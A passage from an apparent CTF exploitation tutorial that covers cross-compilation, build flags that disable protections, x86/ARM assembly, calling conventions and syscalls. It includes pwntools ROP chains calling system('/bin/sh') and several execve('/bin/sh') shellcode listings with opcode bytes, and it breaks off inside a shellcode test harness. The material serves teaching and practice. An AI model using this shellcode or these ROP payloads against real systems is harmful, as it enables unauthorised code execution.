- Exploitation becomes significantly harder
- Often disabled in release builds

## Cross-Compilation

Compiling for different architectures or operating systems.

### Linux Cross-Compilation

```bash
# Install cross-compiler
sudo apt install gcc-arm-linux-gnueabi          # ARM 32-bit
sudo apt install gcc-aarch64-linux-gnu          # ARM 64-bit
sudo apt install gcc-mips-linux-gnu             # MIPS
sudo apt install gcc-multilib                   # 32-bit on 64-bit

# Compile for 32-bit
gcc -m32 source.c -o binary32

# Compile for ARM
arm-linux-gnueabi-gcc source.c -o binary_arm

# Compile for MIPS
mips-linux-gnu-gcc source.c -o binary_mips
```

### Windows Cross-Compilation (MinGW)

```bash
# Install MinGW
sudo apt install mingw-w64

# Compile for Windows 64-bit
x86_64-w64-mingw32-gcc source.c -o binary.exe

# Compile for Windows 32-bit
i686-w64-mingw32-gcc source.c -o binary32.exe

# Static linking (no DLL dependencies)
x86_64-w64-mingw32-gcc -static source.c -o binary.exe
```

## Makefiles and Build Systems

Understanding build systems helps when analyzing or modifying CTF challenge compilation.

### Basic Makefile

```makefile
CC = gcc
CFLAGS = -Wall -O2 -fno-stack-protector -no-pie
LDFLAGS = -z execstack

all: challenge

challenge: challenge.c
	$(CC) $(CFLAGS) $(LDFLAGS) challenge.c -o challenge

clean:
	rm -f challenge
```

```bash
# Build
make

# Rebuild
make clean && make
```

### CMake

```cmake
# CMakeLists.txt
cmake_minimum_required(VERSION 3.10)
project(challenge)

set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -fno-stack-protector -no-pie")

add_executable(challenge challenge.c)
```

```bash
# Build
mkdir build && cd build
cmake ..
make
```

## Debugging Compilation Issues

### Verbose Compilation

```bash
# Show all compilation steps
gcc -v source.c -o binary

# Save temporary files
gcc -save-temps source.c -o binary
# Creates: source.i (preprocessed), source.s (assembly), source.o (object)

# Show linker invocation
gcc -Wl,--verbose source.c -o binary
```

### Common CTF-Related Compilation Commands

```bash
# Vulnerable 32-bit binary (all protections off)
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vuln vuln.c

# Hardened 64-bit binary (all protections on)
gcc -fstack-protector-all -D_FORTIFY_SOURCE=2 -fPIE -pie -Wl,-z,relro,-z,now -o hardened hardened.c

# Static binary with symbols for reverse engineering
gcc -static -g vuln.c -o vuln_static

# Stripped binary
gcc vuln.c -o vuln
strip vuln
```

## Practical CTF Workflow

### Analyzing Compilation

When given a CTF binary:

```bash
# 1. Identify compilation flags used (reconstruct security features)
checksec --file=binary
readelf -h binary
readelf -l binary | grep GNU_

# 2. Check for debug symbols
file binary  # "not stripped" indicates symbols present
nm binary | wc -l  # High count = symbols present

# 3. Identify compiler and potentially version
strings binary | grep -i gcc
readelf -p .comment binary

# 4. Determine optimization level (inference based on code)
objdump -d binary | less
# Look for: Inlining, loop unrolling, register usage patterns
```

### Recompiling for Analysis

If source is provided, recompile with helpful flags:

```bash
# Add debug symbols
gcc -g source.c -o binary_debug

# Disable optimizations
gcc -O0 -g source.c -o binary_debug

# Generate assembly listing with source
gcc -g -Wa,-adhln source.c > source.lst
```

This comprehensive understanding of compilation and linking enables you to identify how security features are implemented, predict binary behavior, and craft exploits that work against specific compilation configurations encountered in CTF challenges.

---

# Assembly Language Basics (x86, x86-64, ARM)

## x86 Architecture Fundamentals

x86 refers to the 32-bit Intel architecture (IA-32), while x86-64 (also called x64 or AMD64) is the 64-bit extension. Understanding assembly is essential for reverse engineering, crafting shellcode, and building ROP chains.

### x86 Registers (32-bit)

**General Purpose Registers** (32-bit):

```
EAX (Accumulator): Arithmetic operations, function return values
EBX (Base): Base pointer for memory access
ECX (Counter): Loop counters, string operations
EDX (Data): I/O operations, arithmetic extension
ESI (Source Index): String/array operations source
EDI (Destination Index): String/array operations destination
EBP (Base Pointer): Stack frame base pointer
ESP (Stack Pointer): Top of stack pointer
```

**16-bit and 8-bit access**:

```
EAX (32-bit): [AX (16-bit): AH (high 8-bit) | AL (low 8-bit)]
EBX (32-bit): [BX (16-bit): BH (high 8-bit) | BL (low 8-bit)]
ECX (32-bit): [CX (16-bit): CH (high 8-bit) | CL (low 8-bit)]
EDX (32-bit): [DX (16-bit): DH (high 8-bit) | DL (low 8-bit)]
ESI (32-bit): [SI (16-bit)]
EDI (32-bit): [DI (16-bit)]
EBP (32-bit): [BP (16-bit)]
ESP (32-bit): [SP (16-bit)]
```

**Special Purpose Registers**:

```
EIP (Instruction Pointer): Address of next instruction to execute
EFLAGS: Status and control flags
```

**Segment Registers** (less relevant in modern protected mode):

```
CS (Code Segment)
DS (Data Segment)
SS (Stack Segment)
ES, FS, GS (Extra Segments)
```

**EFLAGS Register** (important bits):

```
Bit 0:  CF (Carry Flag) - Arithmetic carry/borrow
Bit 2:  PF (Parity Flag) - Even parity of low byte
Bit 4:  AF (Auxiliary Flag) - BCD arithmetic
Bit 6:  ZF (Zero Flag) - Result is zero
Bit 7:  SF (Sign Flag) - Result is negative
Bit 11: OF (Overflow Flag) - Signed overflow
Bit 10: DF (Direction Flag) - String operation direction
Bit 9:  IF (Interrupt Flag) - Interrupts enabled
Bit 8:  TF (Trap Flag) - Single-step debugging
```

### x86-64 Registers (64-bit)

**Extended General Purpose Registers**:

```
RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP (64-bit versions)
R8, R9, R10, R11, R12, R13, R14, R15 (new 64-bit registers)
```

**Register access hierarchy**:

```
RAX (64-bit): [EAX (32-bit): [AX (16-bit): AH | AL]]
R8 (64-bit):  [R8D (32-bit): [R8W (16-bit): R8B (8-bit)]]
```

**Special registers**:

```
RIP (Instruction Pointer): 64-bit instruction pointer
RFLAGS: 64-bit flags register (extends EFLAGS)
```

**Key difference from 32-bit**: Writing to 32-bit registers (e.g., EAX) **zero-extends** to 64 bits, clearing the upper 32 bits of the corresponding 64-bit register (RAX).

```asm
mov eax, 0xffffffff   ; RAX = 0x00000000ffffffff (zero-extended)
mov rax, 0xffffffff   ; RAX = 0x00000000ffffffff
mov rax, -1           ; RAX = 0xffffffffffffffff (sign-extended)
```

### Instruction Syntax: AT&T vs Intel

Two common assembly syntax formats:

**AT&T Syntax** (default on Linux/GCC):

```asm
movl $5, %eax           ; Move immediate 5 to EAX
movl %eax, (%ebx)       ; Move EAX to memory at [EBX]
addl $10, %eax          ; Add 10 to EAX
```

Characteristics:

- Source before destination
- Register names prefixed with `%`
- Immediate values prefixed with `$`
- Size suffixes: `b` (byte), `w` (word), `l` (long), `q` (quad)
- Memory operands: `offset(%base, %index, scale)`

**Intel Syntax** (default on Windows, preferred by many):

```asm
mov eax, 5              ; Move immediate 5 to EAX
mov [ebx], eax          ; Move EAX to memory at [EBX]
add eax, 10             ; Add 10 to EAX
```

Characteristics:

- Destination before source
- No register/immediate prefixes
- Size specified by operand or explicit: `BYTE PTR`, `WORD PTR`, `DWORD PTR`, `QWORD PTR`
- Memory operands: `[base + index*scale + offset]`

**Switching syntax in tools**:

```bash
# GDB/pwndbg
set disassembly-flavor intel

# objdump
objdump -M intel -d binary

# Compile with Intel syntax assembly
gcc -masm=intel -S source.c -o source.s

# radare2 (uses Intel by default)
r2 binary
[0x00000000]> e asm.syntax=att  # Switch to AT&T if needed
```

For this guide, **Intel syntax** will be used as it's more intuitive and commonly used in CTF contexts.

## Common x86/x86-64 Instructions

### Data Movement

**MOV** - Move data between registers, memory, and immediates:

```asm
mov eax, 5              ; EAX = 5
mov eax, ebx            ; EAX = EBX
mov eax, [0x12345678]   ; EAX = value at memory address 0x12345678
mov [ebx], eax          ; Memory at [EBX] = EAX
mov eax, [ebx+4]        ; EAX = value at [EBX+4]
```

**MOVZX** - Move with zero-extension:

```asm
movzx eax, bl           ; EAX = zero-extend BL (0x000000XX)
movzx eax, word ptr [ebx]  ; EAX = zero-extend 16-bit value at [EBX]
```

**MOVSX** - Move with sign-extension:

```asm
movsx eax, bl           ; EAX = sign-extend BL (0xFFFFFFXX if BL negative)
movsx rax, eax          ; RAX = sign-extend EAX to 64-bit
```

**LEA** - Load Effective Address (compute address without dereferencing):

```asm
lea eax, [ebx+8]        ; EAX = EBX + 8 (address calculation, no memory access)
lea rdi, [rip+0x1000]   ; RDI = RIP + 0x1000 (position-independent addressing)
```

LEA is commonly used for:

- Address calculations
- Fast arithmetic (e.g., `lea eax, [eax+eax*2]` = multiply by 3)
- Position-independent code

**PUSH/POP** - Stack operations:

```asm
push eax                ; ESP -= 4, [ESP] = EAX
pop eax                 ; EAX = [ESP], ESP += 4
push 5                  ; Push immediate value
pushad                  ; Push all general-purpose registers (x86 only)
popad                   ; Pop all general-purpose registers (x86 only)
```

On x86-64:

```asm
push rax                ; RSP -= 8, [RSP] = RAX
pop rax                 ; RAX = [RSP], RSP += 8
```

**XCHG** - Exchange values:

```asm
xchg eax, ebx           ; Swap EAX and EBX
xchg eax, [ebx]         ; Swap EAX with value at [EBX]
```

### Arithmetic Operations

**ADD/SUB** - Addition and subtraction:

```asm
add eax, 10             ; EAX += 10
add eax, ebx            ; EAX += EBX
sub eax, 5              ; EAX -= 5
```

**INC/DEC** - Increment and decrement:

```asm
inc eax                 ; EAX += 1
dec eax                 ; EAX -= 1
```

**MUL/IMUL** - Multiplication (unsigned/signed):

```asm
mul ebx                 ; EDX:EAX = EAX * EBX (unsigned, 64-bit result)
imul eax, ebx           ; EAX *= EBX (signed, 32-bit result)
imul eax, ebx, 10       ; EAX = EBX * 10 (three-operand form)
```

**DIV/IDIV** - Division (unsigned/signed):

```asm
div ebx                 ; EAX = EDX:EAX / EBX, EDX = remainder (unsigned)
idiv ebx                ; EAX = EDX:EAX / EBX, EDX = remainder (signed)
```

**NEG** - Two's complement negation:

```asm
neg eax                 ; EAX = -EAX
```

### Logical Operations

**AND/OR/XOR/NOT**:

```asm
and eax, 0xff           ; EAX &= 0xFF (mask low byte)
or eax, 0x80000000      ; EAX |= 0x80000000 (set high bit)
xor eax, eax            ; EAX = 0 (common way to zero register)
not eax                 ; EAX = ~EAX (bitwise NOT)
```

**TEST** - Logical AND without storing result (only sets flags):

```asm
test eax, eax           ; Check if EAX is zero (sets ZF if zero)
test eax, 1             ; Check if low bit is set
```

**CMP** - Compare (subtract without storing result):

```asm
cmp eax, 10             ; Compare EAX with 10 (sets flags based on EAX - 10)
cmp eax, ebx            ; Compare EAX with EBX
```

### Shift and Rotate Operations

**SHL/SHR** - Shift left/right (logical):

```asm
shl eax, 1              ; EAX <<= 1 (multiply by 2)
shr eax, 2              ; EAX >>= 2 (unsigned divide by 4)
shl eax, cl             ; Shift by CL register value
```

**SAL/SAR** - Shift arithmetic left/right:

```asm
sal eax, 1              ; Same as SHL (multiply by 2)
sar eax, 2              ; Arithmetic shift right (preserves sign, divide by 4)
```

**ROL/ROR** - Rotate left/right:

```asm
rol eax, 1              ; Rotate left 1 bit
ror eax, 8              ; Rotate right 8 bits
```

### Control Flow

**JMP** - Unconditional jump:

```asm
jmp target              ; Jump to target address
jmp eax                 ; Jump to address in EAX (indirect jump)
jmp [eax]               ; Jump to address stored at memory [EAX]
```

**Conditional Jumps** (based on EFLAGS):

```asm
je target               ; Jump if equal (ZF=1)
jne target              ; Jump if not equal (ZF=0)
jz target               ; Jump if zero (ZF=1, same as JE)
jnz target              ; Jump if not zero (ZF=0, same as JNE)
jg target               ; Jump if greater (signed: ZF=0 and SF=OF)
jge target              ; Jump if greater or equal (signed: SF=OF)
jl target               ; Jump if less (signed: SF≠OF)
jle target              ; Jump if less or equal (signed: ZF=1 or SF≠OF)
ja target               ; Jump if above (unsigned: CF=0 and ZF=0)
jae target              ; Jump if above or equal (unsigned: CF=0)
jb target               ; Jump if below (unsigned: CF=1)
jbe target              ; Jump if below or equal (unsigned: CF=1 or ZF=1)
js target               ; Jump if sign (SF=1, negative)
jns target              ; Jump if not sign (SF=0, positive)
jo target               ; Jump if overflow (OF=1)
jno target              ; Jump if not overflow (OF=0)
```

**CALL/RET** - Function calls:

```asm
call function           ; Push return address, jump to function
ret                     ; Pop return address, jump to it
ret 0x10                ; Pop return address, clean up 0x10 bytes (stdcall)
```

**LOOP** - Loop control:

```asm
loop target             ; Decrement ECX, jump if ECX ≠ 0
```

### String Operations

These instructions operate on memory buffers, using ESI (source) and EDI (destination):

```asm
movsb                   ; Move byte: [EDI++] = [ESI++]
movsw                   ; Move word: [EDI+=2] = [ESI+=2]
movsd                   ; Move dword: [EDI+=4] = [ESI+=4]
rep movsb               ; Repeat MOVSB ECX times (memory copy)

stosb                   ; Store byte: [EDI++] = AL
stosd                   ; Store dword: [EDI+=4] = EAX
rep stosb               ; Repeat STOSB ECX times (memory fill)

lodsb                   ; Load byte: AL = [ESI++]
lodsd                   ; Load dword: EAX = [ESI+=4]

scasb                   ; Scan byte: Compare AL with [EDI++]
repne scasb             ; Repeat until AL = [EDI] or ECX = 0 (string search)

cmpsb                   ; Compare byte: [ESI++] vs [EDI++]
repe cmpsb              ; Repeat while equal (string comparison)
```

**Direction Flag (DF)** controls operation direction:

```asm
cld                     ; Clear DF: operations increment (forward)
std                     ; Set DF: operations decrement (backward)
```

### Stack Frame Operations

**ENTER/LEAVE** - Function prologue/epilogue:

```asm
enter 0x20, 0           ; Equivalent to: push ebp; mov ebp, esp; sub esp, 0x20
leave                   ; Equivalent to: mov esp, ebp; pop ebp
```

Common function prologue pattern:

```asm
push ebp                ; Save old base pointer
mov ebp, esp            ; Set up new base pointer
sub esp, 0x40           ; Allocate 0x40 bytes for local variables
```

Common function epilogue pattern:

```asm
mov esp, ebp            ; Restore stack pointer
pop ebp                 ; Restore old base pointer
ret                     ; Return to caller
```

Or simply:

```asm
leave                   ; mov esp, ebp; pop ebp
ret
```

### System Instructions

**INT** - Software interrupt:

```asm
int 0x80                ; Linux x86 system call interface
int 0x3                 ; Debugger breakpoint
```

**SYSCALL/SYSENTER** - Fast system call (x86-64):

```asm
syscall                 ; x86-64 system call
sysenter                ; x86 fast system call (Intel)
```

**NOP** - No operation:

```asm
nop                     ; Do nothing (0x90 opcode)
```

Multi-byte NOP instructions exist for alignment (e.g., `0x0F 0x1F 0x00`).

## Calling Conventions

Understanding calling conventions is crucial for function interaction, ROP chain construction, and exploitation.

### x86 (32-bit) Calling Conventions

**cdecl** (C declaration - default for C programs):

- Arguments: Pushed on stack right-to-left
- Return value: EAX (integer), ST(0) (float)
- Caller cleans up stack
- Preserved registers: EBX, ESI, EDI, EBP

```c
int add(int a, int b) {
    return a + b;
}

int main() {
    int result = add(5, 10);
}
```

Assembly (cdecl):

```asm
main:
    push 10             ; Push second argument
    push 5              ; Push first argument
    call add
    add esp, 8          ; Caller cleans up (2 arguments × 4 bytes)
    ; EAX contains return value (15)

add:
    push ebp
    mov ebp, esp
    mov eax, [ebp+8]    ; First argument (a = 5)
    add eax, [ebp+12]   ; Second argument (b = 10)
    pop ebp
    ret                 ; Callee does not clean up
```

**stdcall** (Standard call - Windows API):

- Arguments: Pushed on stack right-to-left
- Return value: EAX
- **Callee** cleans up stack
- Preserved registers: EBX, ESI, EDI, EBP

```asm
add:
    push ebp
    mov ebp, esp
    mov eax, [ebp+8]
    add eax, [ebp+12]
    pop ebp
    ret 8               ; Callee cleans up 8 bytes
```

**fastcall** (Fast call - partial register passing):

- First two arguments: ECX, EDX
- Remaining arguments: Stack (right-to-left)
- Return value: EAX
- Callee cleans up stack
- Preserved registers: EBX, ESI, EDI, EBP

```asm
; fastcall: int add(int a, int b, int c)
; ECX = a, EDX = b, [ESP+4] = c
main:
    push 15             ; Third argument
    mov edx, 10         ; Second argument
    mov ecx, 5          ; First argument
    call add
```

### x86-64 (64-bit) Calling Convention

**System V AMD64 ABI** (Linux, macOS, BSD):

- First 6 integer/pointer arguments: **RDI, RSI, RDX, RCX, R8, R9**
- Additional arguments: Stack (right-to-left)
- Return value: RAX
- Floating-point arguments: XMM0-XMM7
- Preserved registers: RBX, RBP, R12-R15
- Scratch registers: RAX, RDI, RSI, RDX, RCX, R8-R11

```c
long add6(long a, long b, long c, long d, long e, long f) {
    return a + b + c + d + e + f;
}

int main() {
    long result = add6(1, 2, 3, 4, 5, 6);
}
```

Assembly:

```asm
main:
    mov rdi, 1          ; 1st argument
    mov rsi, 2          ; 2nd argument
    mov rdx, 3          ; 3rd argument
    mov rcx, 4          ; 4th argument
    mov r8, 5           ; 5th argument
    mov r9, 6           ; 6th argument
    call add6
    ; RAX contains return value (21)

add6:
    push rbp
    mov rbp, rsp
    mov rax, rdi        ; a
    add rax, rsi        ; + b
    add rax, rdx        ; + c
    add rax, rcx        ; + d
    add rax, r8         ; + e
    add rax, r9         ; + f
    pop rbp
    ret
```

**Microsoft x64** (Windows):

- First 4 arguments: **RCX, RDX, R8, R9**
- Additional arguments: Stack
- Return value: RAX
- Caller must allocate 32 bytes of "shadow space" on stack (even if fewer than 4 args)
- Preserved registers: RBX, RBP, RDI, RSI, RSP, R12-R15
- Scratch registers: RAX, RCX, RDX, R8-R11

```asm
main:
    sub rsp, 0x28       ; Allocate shadow space + alignment
    mov rcx, 1          ; 1st argument
    mov rdx, 2          ; 2nd argument
    mov r8, 3           ; 3rd argument
    mov r9, 4           ; 4th argument
    call function
    add rsp, 0x28       ; Clean up
```

### CTF Calling Convention Exploitation

**Register-based argument passing** (x86-64) allows cleaner ROP chains:

```python
# x86-64 ROP chain to call system("/bin/sh")
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(elf.search(b'/bin/sh'))
system = elf.plt['system']

# Build chain
payload = b'A' * offset
payload += p64(pop_rdi)      # Pop address into RDI
payload += p64(bin_sh)       # "/bin/sh" address
payload += p64(system)       # Call system(RDI)
```

**Stack-based arguments** (x86) require more stack manipulation:

```python
# x86 ROP chain to call system("/bin/sh")
payload = b'A' * offset
payload += p32(system)       # Return address: system
payload += p32(0xdeadbeef)   # Fake return address for system
payload += p32(bin_sh)       # First argument to system
```

## System Calls

System calls are the interface between user programs and the kernel.

### Linux x86 System Calls (int 0x80)

**Mechanism**:

- System call number: EAX
- Arguments: EBX, ECX, EDX, ESI, EDI, EBP (up to 6)
- Return value: EAX
- Invoke: `int 0x80`

**Common system calls** (from `/usr/include/asm/unistd_32.h`):

```
1:  exit(int status)
2:  fork()
3:  read(int fd, void *buf, size_t count)
4:  write(int fd, const void *buf, size_t count)
5:  open(const char *filename, int flags, int mode)
6:  close(int fd)
11: execve(const char *filename, char *const argv[], char *const envp[])
```

**Example - write("Hello\n")**:

```asm
section .data
    msg db 'Hello', 0x0a    ; "Hello\n"
    len equ $ - msg

section .text
    global _start

_start:
    mov eax, 4              ; sys_write
    mov ebx, 1              ; fd = stdout
    mov ecx, msg            ; buf = msg
    mov edx, len            ; count = 6
    int 0x80                ; Invoke system call

    mov eax, 1              ; sys_exit
    xor ebx, ebx            ; status = 0
    int 0x80
```

**Example - execve("/bin/sh", ["/bin/sh", NULL], NULL)**:

```asm
section .text
    global _start

_start:
    xor eax, eax            ; EAX = 0
    push eax                ; NULL terminator
    push 0x68732f2f         ; "//sh"
    push 0x6e69622f         ; "/bin"
    mov ebx, esp            ; EBX = pointer to "/bin//sh"
    push eax                ; NULL (envp)
    push ebx                ; argv[0] = "/bin//sh"
    mov ecx, esp            ; ECX = argv
    xor edx, edx            ; EDX = NULL (envp)
    mov al, 11              ; sys_execve
    int 0x80
```

### Linux x86-64 System Calls (syscall)

**Mechanism**:

- System call number: RAX
- Arguments: RDI, RSI, RDX, R10, R8, R9 (up to 6)
- Return value: RAX
- Invoke: `syscall`

**Note**: RCX and R11 are clobbered by `syscall` instruction.

**Common system calls** (from `/usr/include/asm/unistd_64.h`):

```
0:  read(int fd, void *buf, size_t count)
1:  write(int fd, const void *buf, size_t count)
2:  open(const char *filename, int flags, int mode)
3:  close(int fd)
59: execve(const char *filename, char *const argv[], char *const envp[])
60: exit(int status)
```

**Example - write("Hello\n")**:

```asm
section .data
    msg db 'Hello', 0x0a
    len equ $ - msg

section .text
    global _start

_start:
    mov rax, 1              ; sys_write
    mov rdi, 1              ; fd = stdout
    lea rsi, [rel msg]      ; buf = msg (position-independent)
    mov rdx, len            ; count = 6
    syscall

    mov rax, 60             ; sys_exit
    xor rdi, rdi            ; status = 0
    syscall
```

**Example - execve("/bin/sh", ["/bin/sh", NULL], NULL)**:

```asm
section .text
    global _start

_start:
    xor rax, rax            ; RAX = 0
    push rax                ; NULL terminator
    mov rbx, 0x68732f6e69622f2f  ; "//bin/sh" (8 bytes)
    push rbx
    mov rdi, rsp            ; RDI = pointer to "/bin//sh"
    push rax                ; argv[1] = NULL
    push rdi                ; argv[0] = "/bin//sh"
    mov rsi, rsp            ; RSI = argv
    xor rdx, rdx            ; RDX = NULL (envp)
    mov al, 59              ; sys_execve
    syscall
```

### Finding System Call Numbers

```bash
# x86 system calls
grep -r "define __NR_" /usr/include/asm/unistd_32.h

# x86-64 system calls
grep -r "define __NR_" /usr/include/asm/unistd_64.h

# Or use ausyscall (from auditd package)
ausyscall --dump
ausyscall x86_64 execve    # Find specific syscall number
```

## ARM Architecture Basics

ARM is a RISC (Reduced Instruction Set Computer) architecture commonly found in embedded systems, mobile devices, and increasingly in servers.

### ARM Registers

**General Purpose Registers** (32-bit ARM):

```
R0-R12: General purpose registers
R13 (SP): Stack Pointer
R14 (LR): Link Register (stores return address)
R15 (PC): Program Counter
CPSR: Current Program Status Register (flags)
```

**Argument passing and return**:

- First 4 arguments: R0, R1, R2, R3
- Additional arguments: Stack
- Return value: R0

**Preserved registers**: R4-R11 **Scratch registers**: R0-R3, R12

**64-bit ARM (AArch64)**:

```
X0-X30: 64-bit general purpose registers
W0-W30: 32-bit versions (low 32 bits of X0-X30)
SP: Stack Pointer
LR (X30): Link Register
PC: Program Counter
PSTATE: Processor State (flags)
```

**Argument passing** (AArch64):

- First 8 arguments: X0-X7
- Additional arguments: Stack
- Return value: X0

### ARM Instruction Set

ARM has multiple instruction sets:

- **ARM mode**: 32-bit fixed-length instructions
- **Thumb mode**: 16-bit variable-length instructions (higher code density)
- **Thumb-2**: Mix of 16-bit and 32-bit instructions

**Switching modes**:

- BX (Branch and Exchange) instruction
- LSB of target address determines mode: 0=ARM, 1=Thumb

### Common ARM Instructions (32-bit)

**Data movement**:

```asm
MOV R0, #5              ; R0 = 5
MOV R0, R1              ; R0 = R1
LDR R0, [R1]            ; R0 = *R1 (load word)
LDR R0, [R1, #4]        ; R0 = *(R1 + 4)
STR R0, [R1]            ; *R1 = R0 (store word)
LDRB R0, [R1]           ; R0 = *(byte *)R1 (load byte)
STRB R0, [R1]           ; *(byte *)R1 = R0 (store byte)
```

**Arithmetic**:

```asm
ADD R0, R1, R2          ; R0 = R1 + R2
ADD R0, R1, #10         ; R0 = R1 + 10
SUB R0, R1, R2          ; R0 = R1 - R2
MUL R0, R1, R2          ; R0 = R1 * R2
```

**Logical**:

```asm
AND R0, R1, R2          ; R0 = R1 & R2
ORR R0, R1, R2          ; R0 = R1 | R2
EOR R0, R1, R2          ; R0 = R1 ^ R2 (XOR)
MVN R0, R1              ; R0 = ~R1 (NOT)
```

**Comparison**:

```asm
CMP R0, R1              ; Compare R0 with R1 (sets flags)
TST R0, R1              ; Test R0 & R1 (sets flags)
```

**Branches**:

```asm
B label                 ; Unconditional branch
BL function             ; Branch with link (call function, LR = return address)
BX R0                   ; Branch and exchange (can switch ARM/Thumb)
BLX R0                  ; Branch with link and exchange

; Conditional branches (based on flags)
BEQ label               ; Branch if equal (Z=1)
BNE label               ; Branch if not equal (Z=0)
BGT label               ; Branch if greater than (signed)
BLT label               ; Branch if less than (signed)
BGE label               ; Branch if greater or equal
BLE label               ; Branch if less or equal
```

**Stack operations**:

```asm
PUSH {R0-R3, LR}        ; Push registers onto stack
POP {R0-R3, PC}         ; Pop registers (popping to PC returns)
STMFD SP!, {R0-R3}      ; Push (Store Multiple Full Descending)
LDMFD SP!, {R0-R3}      ; Pop (Load Multiple Full Descending)
```

**Conditional execution** (cont.): ARM instructions can be conditionally executed based on flags:

```asm
ADDEQ R0, R1, R2        ; R0 = R1 + R2 only if equal (Z=1)
MOVNE R0, #5            ; R0 = 5 only if not equal (Z=0)
SUBGT R0, R1, R2        ; R0 = R1 - R2 only if greater than
LDRLT R0, [R1]          ; R0 = *R1 only if less than
```

This eliminates many branch instructions and improves performance.

**Condition codes**:

```
EQ: Equal (Z=1)
NE: Not equal (Z=0)
GT: Greater than (signed)
LT: Less than (signed)
GE: Greater or equal (signed)
LE: Less or equal (signed)
HI: Higher (unsigned)
LS: Lower or same (unsigned)
AL: Always (default, can be omitted)
```

### ARM Function Prologue/Epilogue

**Standard function entry**:

```asm
function:
    PUSH {R4-R11, LR}       ; Save preserved registers and return address
    SUB SP, SP, #0x20       ; Allocate stack space for locals
    ; Function body
    ADD SP, SP, #0x20       ; Deallocate stack space
    POP {R4-R11, PC}        ; Restore registers and return (pop to PC)
```

**Simple function** (no preserved registers used):

```asm
simple_function:
    PUSH {LR}               ; Save return address
    ; Function body
    POP {PC}                ; Return
```

Or even simpler using BX:

```asm
leaf_function:
    ; Function body (no calls to other functions)
    BX LR                   ; Return to caller
```

### ARM64 (AArch64) Differences

**Key changes from 32-bit ARM**:

- All instructions are 32-bit (no Thumb mode)
- Registers are 64-bit (X0-X30) with 32-bit access (W0-W30)
- PC is no longer directly accessible as a general-purpose register
- More registers available (31 general-purpose)
- Stack pointer must be 16-byte aligned

**Common AArch64 instructions**:

```asm
; Data movement
MOV X0, #5              ; X0 = 5
MOV X0, X1              ; X0 = X1
LDR X0, [X1]            ; X0 = *X1 (load 64-bit)
LDR W0, [X1]            ; W0 = *(32-bit *)X1 (load 32-bit)
STR X0, [X1]            ; *X1 = X0 (store 64-bit)
LDRB W0, [X1]           ; W0 = *(byte *)X1 (load byte)

; Arithmetic
ADD X0, X1, X2          ; X0 = X1 + X2
ADD X0, X1, #10         ; X0 = X1 + 10
SUB X0, X1, X2          ; X0 = X1 - X2
MUL X0, X1, X2          ; X0 = X1 * X2

; Branches
B label                 ; Unconditional branch
BL function             ; Branch with link (X30/LR = return address)
BR X0                   ; Branch to register
BLR X0                  ; Branch with link to register
RET                     ; Return (BR X30)

; Conditional branches
B.EQ label              ; Branch if equal
B.NE label              ; Branch if not equal
CBZ X0, label           ; Compare and branch if zero
CBNZ X0, label          ; Compare and branch if not zero

; Stack operations
STP X0, X1, [SP, #-16]! ; Store pair, pre-decrement SP by 16
LDP X0, X1, [SP], #16   ; Load pair, post-increment SP by 16
```

**AArch64 function prologue/epilogue**:

```asm
function:
    STP X29, X30, [SP, #-16]!   ; Save FP and LR, adjust SP
    MOV X29, SP                  ; Set up frame pointer
    SUB SP, SP, #0x20            ; Allocate stack space
    ; Function body
    ADD SP, SP, #0x20            ; Deallocate stack space
    LDP X29, X30, [SP], #16      ; Restore FP and LR, adjust SP
    RET                          ; Return
```

### ARM System Calls

**32-bit ARM (EABI)**:

- System call number: R7
- Arguments: R0, R1, R2, R3, R4, R5, R6 (up to 7)
- Return value: R0
- Invoke: `SWI 0` or `SVC 0`

**Common ARM system calls** (similar numbers to x86):

```
1:  exit(int status)
3:  read(int fd, void *buf, size_t count)
4:  write(int fd, const void *buf, size_t count)
11: execve(const char *filename, char *const argv[], char *const envp[])
```

**Example - ARM execve("/bin/sh", NULL, NULL)**:

```asm
.section .text
.global _start

_start:
    ADD R0, PC, #12         ; R0 = address of "/bin/sh" string
    MOV R1, #0              ; R1 = NULL (argv)
    MOV R2, #0              ; R2 = NULL (envp)
    MOV R7, #11             ; sys_execve
    SWI 0                   ; System call

binsh:
    .ascii "/bin/sh\0"
```

**AArch64 system calls**:

- System call number: X8
- Arguments: X0-X6
- Return value: X0
- Invoke: `SVC 0`

**Example - AArch64 execve("/bin/sh", NULL, NULL)**:

```asm
.section .text
.global _start

_start:
    ADR X0, binsh           ; X0 = address of "/bin/sh"
    MOV X1, #0              ; X1 = NULL (argv)
    MOV X2, #0              ; X2 = NULL (envp)
    MOV X8, #221            ; sys_execve (AArch64)
    SVC 0                   ; System call

binsh:
    .ascii "/bin/sh\0"
```

## Shellcode Development

Shellcode is machine code designed to be injected into a vulnerable process. Understanding assembly is essential for writing effective shellcode.

### Shellcode Requirements

**Key constraints**:

1. **Position-independent**: Must work at any memory address
2. **Null-byte free**: Often injected via string functions that terminate on null bytes
3. **Compact**: Smaller is better for tight buffer constraints
4. **Self-contained**: Cannot rely on external data

### x86 Linux Shellcode Example

**execve("/bin/sh") shellcode** (23 bytes):

```asm
global _start

_start:
    xor eax, eax            ; EAX = 0
    push eax                ; Push NULL terminator
    push 0x68732f2f         ; Push "//sh"
    push 0x6e69622f         ; Push "/bin"
    mov ebx, esp            ; EBX = pointer to "/bin//sh"
    push eax                ; Push NULL for argv[1]
    mov edx, esp            ; EDX = pointer to NULL (envp)
    push ebx                ; Push address of "/bin//sh"
    mov ecx, esp            ; ECX = argv
    mov al, 0xb             ; sys_execve (11)
    int 0x80                ; Execute
```

**Assemble and extract opcodes**:

```bash
# Assemble
nasm -f elf32 shellcode.asm -o shellcode.o
ld -m elf_i386 shellcode.o -o shellcode

# Extract shellcode bytes
objdump -d shellcode -M intel
# Or use objcopy
objcopy -O binary shellcode shellcode.bin
xxd -p shellcode.bin

# Python one-liner to format
python3 -c "import sys; print(''.join(['\\x%02x' % b for b in open('shellcode.bin', 'rb').read()]))"
```

**Result**:

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

**Testing shellcode**:

```c
// test.c
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = 
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
